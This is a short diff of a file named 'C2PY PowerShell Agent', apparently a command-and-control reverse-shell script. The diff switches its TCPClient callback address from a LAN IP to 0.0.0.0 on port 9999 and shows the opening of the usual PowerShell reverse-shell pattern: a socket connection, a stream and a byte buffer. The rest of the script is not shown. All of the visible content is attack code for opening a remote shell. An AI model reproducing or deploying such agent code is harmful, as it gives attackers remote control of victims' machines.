@@ -1,5 +1,5 @@
 # C2PY PowerShell Agent
-$client = New-Object System.Net.Sockets.TCPClient('192.168.1.21',9999)
+$client = New-Object System.Net.Sockets.TCPClient('0.0.0.0',9999)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535|%{0}
 
